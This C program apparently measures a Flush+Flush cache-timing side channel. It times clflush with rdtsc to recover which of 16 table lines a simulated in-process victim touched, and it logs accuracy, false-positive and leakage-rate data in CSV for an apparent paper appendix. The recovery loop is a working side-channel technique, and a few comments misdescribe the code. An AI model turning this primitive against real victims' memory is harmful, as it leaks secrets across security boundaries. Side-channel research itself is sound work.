#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>    //for time() to seed rand() in main
#include <unistd.h>  //for getpid(), used to vary the RNG seed across runs

//tunable constants
#define CACHE_LINE   64      /* bytes; probes must sit on separate lines. WHY 64? */
#define NUM_SAMPLES  10000  /* repetitions for the calibration histogram */
#define THRESHOLD 65 //calibration threshold. Change for each machine

/* rdtsc_start(): read the timestamp counter to OPEN a timing window.
 * Return: the 64-bit counter value (combine the two 32-bit halves). */
static inline uint64_t rdtsc_start(void)
{
    uint32_t lo; //will hold low the 32 bits of 64 bit counter
    uint32_t hi; //will hold the high 32 bits of 64 bit counter
    asm volatile (
        "lfence\n\t"   /* wait for all EARLIER loads to finish, so work from
                          before the timer can't bleed into the measurement */
        "rdtsc\n\t"    /* read the 64-bit Time-Stamp Counter:
                          hardware puts low 32 bits in EAX, high 32 bits in EDX */
        : "=a"(lo),    /* output: tie EAX into lo   ("a" = eax/rax register) */
          "=d"(hi)     /* output: tie EDX into hi   ("d" = edx/rdx register) */
        :              /* no inputs */
        : "memory"     /* clobber: compiler must not move memory ops across this */
    );
    return ((uint64_t)hi << 32) | lo;
    /* widen hi to 64 bits FIRST, then shift up by 32, then OR in lo.
       widening before the shift is what stops the high bits falling off. */
}

// rdtsc_end(): read the TSC to CLOSE the window.
static inline uint64_t rdtsc_end(void)
{
    uint32_t lo;   /* low  32 bits of the counter */
    uint32_t hi;   /* high 32 bits of the counter */

    asm volatile (
        "rdtscp\n\t"   //read TSC but wait for all earlier instructions to retire first
        "lfence\n\t"   //stop later instructions from sneaking back before the clock read. On the end side of fence goes after.
        : "=a"(lo),    //eas us ki
          "=d"(hi)     //edx is high
        :              
        : "rcx", "memory"  //rdtscp writes ecx so we must declare rcx clobbered
    );

    return ((uint64_t)hi << 32) | lo;   //same as rdtsc_start
}

// flush(addr): evict ONE line (the one containing addr) from the caches.
static inline void flush(void *addr)
{
    asm volatile (
        "clflush (%0)\n\t"   //evict the cache line containing addr from all levels. %0 means memory at address in oeprand 0.
        :                    //no outputs
        : "r"(addr)          //input 0: addr, placed in any general register. r = any register the compiler picks
        : "memory"           //this changes memory state the compiler can't see so dont reorder anything across it
    );
}

//timed flush
static uint64_t time_flush(volatile uint8_t *addr)
{
    uint64_t t0, t1;        //start and end timestamps
    t0 = rdtsc_start();     //open the window, fence, then read clock
    flush ((void *)addr);   //flush the line
    t1 = rdtsc_end();       //close the timing window
    return t1 - t0;         //returns the cycles the single load took. small is probably cache hit and large is probably dram miss
}

static void calibrate(void)
{
    uint8_t *buf;
    //one page aligned and probe just a single line
    if (posix_memalign((void **)&buf, 4096, 4096) != 0) {
        perror("posix_memalign");
        exit(1);
    }
    volatile uint8_t *probe = buf + 0;   //line to measure
    *probe = 1;                          //touch so page is mapped in
    //access then time no flush (hit loop)
    for (int i = 0; i < NUM_SAMPLES; i++) {
        (void)*probe;                    //make sure line is cached
        uint64_t cycles = time_flush(probe);
        printf("hit %lu\n", cycles);     //dump raw into stats
    }

    //flush then time it (miss loop)
    for (int i = 0; i < NUM_SAMPLES; i++) {
        flush((void *)probe);            //evict
        uint64_t cycles = time_flush(probe);
        printf("miss %lu\n", cycles);
    }

    free(buf);
}


#define NUM_SECRETS 16  //secret
#define STRIDE 4096 //spacing between probe lines (one page)

static int probe_order[NUM_SECRETS];   //shuffled reload order; defeats the prefetcher
static void init_probe_order(void);    //fills + shuffles probe_order (defined below main)
static void shuffle_order(int *order, int n);   //generic Fisher-Yates shuffle (defined below main),
                                                   //used for probe_order AND for the flush-all preamble
                                                   //so neither scan walks the table in sequential
                                                   //address order, which a stream prefetcher could latch onto

static void victim(volatile uint8_t *table, int secret)
{
    (void)table[secret * STRIDE];   //data dependent load which line is touched depends on secret
}

//attack loop
static int recover_one(volatile uint8_t *table, int secret)
{
    //flush every candidate line so we start uncached
    for (int i = 0; i < NUM_SECRETS; i++)
        flush((void *)&table[i * STRIDE]);

    //let victim run.
    victim(table, secret);

    // flush every candidate and time each. One above threshold is the line the victim touched. 
    for (int i = 0; i < NUM_SECRETS; i++) {
        int idx = probe_order[i];                     //shuffled index
        uint64_t t = time_flush(&table[idx * STRIDE]);
        if (t > THRESHOLD)
            return idx;                               //hit = secret
    }
    return -1;                                        //no hit detected

}

static int recover_one_measure(volatile uint8_t *table,   //table: shared buffer, NUM_SECRETS+1 lines
                                int secret,                //secret: line victim should touch (ignored if run_victim==0)
                                int run_victim,             //run_victim: 1 = real trial, 0 = no-victim control trial
                                uint64_t *probe_times /* size NUM_SECRETS */,   //probe_times: out-param, one cycle count per real line
                                uint64_t *control_time,    //control_time: out-param, cycle count for the unrelated line
                                int *control_hit,          //control_hit: out-param, 1 if the control line read above the frozen THRESHOLD
                                uint64_t *trial_cycles)    //trial_cycles: out-param, cycles for the whole trial
{
    uint64_t t0 = rdtsc_start();   //t0: opens the whole-trial timing window

    int flush_order[NUM_SECRETS + 1];                //shuffled flush-all order, size NUM_SECRETS+1 (includes the control line)
    shuffle_order(flush_order, NUM_SECRETS + 1);      //fresh shuffle each trial -- no sequential address pattern for a prefetcher to latch onto
    for (int i = 0; i <= NUM_SECRETS; i++)          //i: flush all real lines + the control line, in shuffled order
        flush((void *)&table[flush_order[i] * STRIDE]);

    if (run_victim)          //only touch the table when this is a real (non-control) trial
        victim(table, secret);

    int probe_scan[NUM_SECRETS + 1];              //shuffled scan order over ALL 17 lines (16 candidates + control)
    shuffle_order(probe_scan, NUM_SECRETS + 1);   //control's position varies trial to trial, not fixed last

    int guess = -1;   //guess: first candidate line whose flush timing reads above THRESHOLD, else -1
    for (int i = 0; i <= NUM_SECRETS; i++) {   //i: position in the shuffled probe scan (0..NUM_SECRETS inclusive)
        int idx = probe_scan[i];                     //shuffled index, may be a candidate (0..15) or the control line (16)
        uint64_t t = time_flush(&table[idx * STRIDE]);   //t: cycles this candidate's flush took

        if (idx == NUM_SECRETS) {
            *control_time = t;                        //this probe was the control line, wherever it landed in the scan
            *control_hit  = (t > THRESHOLD);           //did it read above the SAME frozen threshold every trial uses?
        } else {
            probe_times[idx] = t;                      //keep every candidate sample for the timing distribution
            if (t > THRESHOLD && guess == -1)          //hit = cached = SLOWER flush than the frozen THRESHOLD
                guess = idx;                           //first hit in shuffled order = guess
        }
    }

    uint64_t t1 = rdtsc_end();   //t1: closes the whole-trial timing window
    *trial_cycles = t1 - t0;     //write out this trial's total latency in cycles
    return guess;                //-1 if no candidate crossed threshold
}

static void print_probe_times(const uint64_t *probe_times)   //probe_times: NUM_SECRETS cycle counts to print as one CSV field
{
    for (int i = 0; i < NUM_SECRETS; i++)   //i: index into probe_times being printed
        printf("%lu%s", probe_times[i], (i + 1 < NUM_SECRETS) ? ";" : "");   //semicolon-separate, no trailing separator
}

static void measure(void)   //no arguments, no return: drives the full 10-run measurement sweep
{
    const int RUNS             = 10;     //10 runs
    const int TRIALS_PER_RUN   = 10000;  //10,000 fresh balanced trials per run
    const int CONTROL_TRIALS   = 1000;   //no-victim control trials per run (separate budget)

    //setup cost: allocation + mapping the table in, timed once, not per trial/run
    uint64_t setup_t0 = rdtsc_start();   //setup_t0: opens the setup-cost timing window
    uint8_t *table;   //shared probe table, NUM_SECRETS real lines + 1 unrelated-line control, filled below
    if (posix_memalign((void **)&table, 4096,                 //page-align the table
                       (size_t)(NUM_SECRETS + 1) * STRIDE) != 0) {   //NUM_SECRETS+1 lines, STRIDE bytes apart
        perror("posix_memalign");   //report the libc error string
        exit(1);                    //can't continue without the table
    }
    memset(table, 1, (size_t)(NUM_SECRETS + 1) * STRIDE);   //map every page in, including control line
    uint64_t setup_t1 = rdtsc_end();          //setup_t1: closes the setup-cost timing window
    uint64_t setup_cycles = setup_t1 - setup_t0;   //setup_cycles: total allocation+mapping cost, reported once

    size_t mem_bytes = (size_t)(NUM_SECRETS + 1) * STRIDE;  //deterministic, reported not measured

    //header: metadata line, then per-trial CSV rows
    printf("# setup_cycles=%lu mem_bytes=%zu threshold=%d\n", setup_cycles, mem_bytes, THRESHOLD);   //one-time metadata row
    printf("run,trial_type,trial_id,secret,guess,correct,control_hit,trial_cycles,probe_times\n");   //CSV column header

    for (int run = 0; run < RUNS; run++) {   //run: which of the 10 runs this is
        srand((unsigned)time(NULL) + (unsigned)run * 7919u + (unsigned)getpid());  //fresh seed per run
        //(recover_one_measure shuffles its own flush/probe orders per trial now, so no
        //per-run init_probe_order() call is needed here -- that's only for recover_one()/attack mode)

        int correct = 0, false_negatives = 0;   //correct: right guesses this run; false_negatives: secret touched but no hit detected

        struct timespec wall0, wall1;   //wall0/wall1: wall-clock timestamps bracketing the real-trial loop
        clock_gettime(CLOCK_MONOTONIC, &wall0);   //wall0: start of the 10,000 real trials, for trials/s and bits/s

        for (int t = 0; t < TRIALS_PER_RUN; t++) {   //t: trial counter within this run's real-trial loop
            int secret = rand() % NUM_SECRETS;       //balanced: uniform over the 16 lines
            uint64_t probe_times[NUM_SECRETS], control_time, trial_cycles;   //per-trial out-params from recover_one_measure
            int control_hit;                                                  //1 if the control line read above this trial's own median
            int guess = recover_one_measure(table, secret, /*run_victim=*/1,   //guess: this trial's recovered line, or -1
                                             probe_times, &control_time, &control_hit, &trial_cycles);
            int correct_flag = (guess == secret);   //correct_flag: 1 if this trial's guess matched the secret
            correct += correct_flag;                //tally correct guesses for this run's accuracy
            if (guess == -1)
                false_negatives++;                   //secret was touched, nothing crossed threshold

            printf("%d,real,%d,%d,%d,%d,%d,%lu,", run, t, secret, guess, correct_flag,   //CSV row: identifying + outcome fields
                   control_hit, trial_cycles);   //control_hit flag + this trial's total cycles
            print_probe_times(probe_times);   //append the 16 semicolon-joined probe timings
            printf("\n");   //terminate the CSV row
        }

        clock_gettime(CLOCK_MONOTONIC, &wall1);   //wall1: end of the 10,000 real trials
        double wall_sec = (double)(wall1.tv_sec - wall0.tv_sec)      //wall_sec: elapsed wall time for the real-trial loop, in seconds
                         + (double)(wall1.tv_nsec - wall0.tv_nsec) / 1e9;

        int false_positives = 0, control_line_violations = 0;   //false_positives: no-victim trials that still guessed a line; control_line_violations: unrelated line misread as a hit
        for (int t = 0; t < CONTROL_TRIALS; t++) {   //t: trial counter within this run's no-victim control loop
            uint64_t probe_times[NUM_SECRETS], control_time, trial_cycles;   //per-trial out-params from recover_one_measure
            int control_hit;                                                  //1 if the control line read above this trial's own median
            int guess = recover_one_measure(table, /*secret unused*/ -1, /*run_victim=*/0,   //guess: this control trial's result, should be -1
                                             probe_times, &control_time, &control_hit, &trial_cycles);
            if (guess != -1)
                false_positives++;                   //claimed a hit with no victim access at all
            if (control_hit)
                control_line_violations++;            //unrelated line should never read as a hit

            printf("%d,control,%d,%d,%d,%d,%d,%lu,", run, t, -1, guess, 0,   //CSV row: secret is n/a (-1), correct is always 0
                   control_hit, trial_cycles);   //control_hit flag + this trial's total cycles
            print_probe_times(probe_times);   //append the 16 semicolon-joined probe timings
            printf("\n");   //terminate the CSV row
        }

        double accuracy      = 100.0 * correct / TRIALS_PER_RUN;              //accuracy: % of real trials correctly recovered
        double fn_rate        = 100.0 * false_negatives / TRIALS_PER_RUN;      //fn_rate: % of real trials with no detected hit
        double fp_rate         = 100.0 * false_positives / CONTROL_TRIALS;      //fp_rate: % of no-victim trials that still claimed a hit
        double trials_per_sec  = TRIALS_PER_RUN / wall_sec;                     //trials_per_sec: real-trial throughput
        double bits_per_sec    = (correct * 4.0 /* log2(NUM_SECRETS) */) / wall_sec;   //bits_per_sec: leakage rate from correct guesses only

        fprintf(stderr,   //summary goes to stderr so stdout stays pure CSV
            "run %d summary: accuracy=%.2f%% fn_rate=%.2f%% fp_rate=%.2f%% "
            "trials_per_sec=%.1f bits_per_sec=%.1f control_line_violations=%d/%d "
            "setup_cycles=%lu mem_bytes=%zu wall_sec=%.4f\n",
            run, accuracy, fn_rate, fp_rate, trials_per_sec, bits_per_sec,
            control_line_violations, CONTROL_TRIALS, setup_cycles, mem_bytes, wall_sec);
    }

    free(table);   //release the shared probe table once all 10 runs are done
}

int main(int argc, char **argv)
{
    //need a mode: ./fr calibrate   or   ./fr attack
    if (argc < 2) {
        fprintf(stderr, "usage: %s calibrate|attack|measure\n", argv[0]);
        return 1;
    }

    //CALIBRATE MODE: dump hit/miss cycle samples then stop
    if (strcmp(argv[1], "calibrate") == 0) {
        calibrate();        //prints "hit N" / "miss N" lines to stdout
        return 0;
    }

    //ATTACK MODE: recover many random secrets and report accuracy
    if (strcmp(argv[1], "attack") == 0) {
        //shared probe table: NUM_SECRETS lines, each STRIDE apart
        uint8_t *table;
        if (posix_memalign((void **)&table, 4096,
                           (size_t)NUM_SECRETS * STRIDE) != 0) {
            perror("posix_memalign");
            return 1;
        }
        memset(table, 1, (size_t)NUM_SECRETS * STRIDE);  //map every page in

        srand((unsigned)time(NULL));   //seed rng for secrets + shuffle
        init_probe_order();            //build the shuffled reload order

        int trials = 1000;             //how many secrets to try
        int correct = 0;               //how many we recovered right

        for (int t = 0; t < trials; t++) {
            int secret = rand() % NUM_SECRETS;          //victim's secret
            int guess  = recover_one(table, secret);    //our recovery
            if (guess == secret)
                correct++;
        }

        printf("accuracy: %d/%d = %.1f%%\n",
               correct, trials, 100.0 * correct / trials);

        free(table);
        return 0;
    }

    //MEASURE MODE: 10 runs x 10,000 fresh balanced trials + per-run no-victim
    //and unrelated-line controls; prints a per-trial CSV to stdout and a
    //summary line per run to stderr (keep them separate: `./ff measure > data.csv`)
    if (strcmp(argv[1], "measure") == 0) {   //argv[1] == "measure"
        measure();   //runs the full Appendix D.1 data collection sweep
        return 0;      //success exit
    }

    fprintf(stderr, "unknown mode: %s\n", argv[1]);
    return 1;
}

//generic Fisher-Yates shuffle: fills order[0..n-1] with 0..n-1 in random order.
//Shared by probe_order (post-victim probe scan) and the per-trial flush-all
//preamble, so NEITHER walks the table in sequential address order.
static void shuffle_order(int *order, int n)   //order: array to fill, size n; n: how many indices to shuffle
{
    for (int i = 0; i < n; i++)   //start identity
        order[i] = i;

    for (int i = n - 1; i > 0; i--) {   //walk from end down
        int j = rand() % (i + 1);        // pick j in [0, i]
        int tmp = order[i];               //swap i and j
        order[i] = order[j];
        order[j] = tmp;
    }
}

//probe order
static void init_probe_order(void)
{
    for (int i = 0; i < NUM_SECRETS; i++)   //start identity
        probe_order[i] = i;

    for (int i = NUM_SECRETS - 1; i > 0; i--) {   //walk from end down
        int j = rand() % (i + 1);                 // pick j in [0, i]
        int tmp = probe_order[i];                 //swap i and j
        probe_order[i] = probe_order[j];
        probe_order[j] = tmp;
    }
}

